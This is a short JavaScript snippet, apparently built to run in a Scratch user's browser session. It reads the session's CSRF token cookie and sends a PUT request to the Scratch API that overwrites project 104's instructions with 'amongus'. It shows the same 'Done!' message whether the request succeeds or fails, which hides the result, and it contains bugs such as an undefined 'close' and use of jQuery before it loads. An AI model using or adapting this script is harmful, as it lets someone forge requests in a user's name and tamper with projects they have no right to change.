var tag = document.createElement("script");
tag.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js";
document.getElementsByTagName("head")[0].appendChild(tag);
var User = "CatsUnited";
function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i += 1) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
$.ajax({
    url: "https://api.scratch.mit.edu/projects/104",
    Connection: close,
    data: '{"instructions":"amongus"}',
    type: "PUT",
    headers: { accept: "application/json", "content-type": "application/json", "X-Requested-With": "XMLHttpRequest", "X-CSRFToken": getCookie("scratchcsrftoken") },
    processData: false,
    success: function () {
        alert("Done!");
    },
    error: function () {
        alert("Done!");
    },
});
